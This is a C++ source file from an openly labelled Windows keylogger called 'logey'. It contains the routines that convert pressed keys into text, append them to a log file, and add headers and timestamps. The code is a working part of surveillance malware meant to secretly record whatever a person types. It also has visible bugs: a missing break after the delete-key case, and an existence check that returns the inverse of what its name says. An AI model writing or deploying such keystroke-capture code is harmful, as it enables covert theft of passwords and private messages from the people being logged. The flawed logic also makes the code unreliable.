#include "logey.h" // Include all necessary functions for logey

void captureKey(int key, std::string filename) {
	std::ofstream file(filename, std::ios_base::app); // Open a log file in append mode
	std::string description; // An empty string that will hold the description of the pressed key

	switch (key) {
	case VK_RETURN:
		description = "{ENTER}";
		break;
	case VK_SHIFT:
		description = "{SHIFT}";
		break;
	case VK_SPACE:
		description = "{SPACE}";
		break;
	case VK_BACK:
		description = "{BACKSPACE}";
		break;
	case VK_CONTROL:
		description = "{CTRL}";
		break;
	case VK_TAB:
		description = "{TAB}";
		break;
	case VK_ESCAPE:
		description = "{ESC}";
		break;
	case VK_MENU:
		description = "{ALT}";
		break;
	case VK_DELETE:
		description = "{DEL}";
	default:
		char c = '\0';
		if (key >= 33 && key <= 126) {
			c = (char)key;
			description = c;
		}
		else {
			description = "{" + std::to_string(key) + "}";
		}
		break;
	}

#ifdef DEBUG // Only in debug mode
	std::clog << description; // Text is written to the console. (Yes it improves performance too)
#endif

	file << description; // But in all cases Text is written to the log file

	file.close(); // Close the log file as soon as possible
}

void createFileHeader(std::string filename) {
	if (fexists(filename)) {
		std::ofstream file(filename, std::ios_base::app);
		file << "--------------------------------" << std::endl;
		file << "logey -- A keylogger for Windows" << std::endl;
		file << "Author : exler" << std::endl;
		file << "License: MIT" << std::endl;
		file << "--------------------------------" << std::endl;
		file.close(); // Close the log file as soon as possible
	}
}

void createTimeStamp(std::string filename) {
	std::ofstream file(filename, std::ios_base::app); // Open a log file in append mode

	char str[26];
	auto time = std::chrono::system_clock::now();
	std::time_t timestamp = std::chrono::system_clock::to_time_t(time);
	ctime_s(str, sizeof(str), &timestamp);

	file << std::endl;
	file << "--------------------------------" << std::endl;
	file << "Timestamp: " << str;
	file << "--------------------------------" << std::endl;

	file.close(); // Close the log file as soon as possible
}

bool fexists(std::string filename) {
	if (std::ifstream(filename)) {
		return false;
	} else {
		return true;
	}
}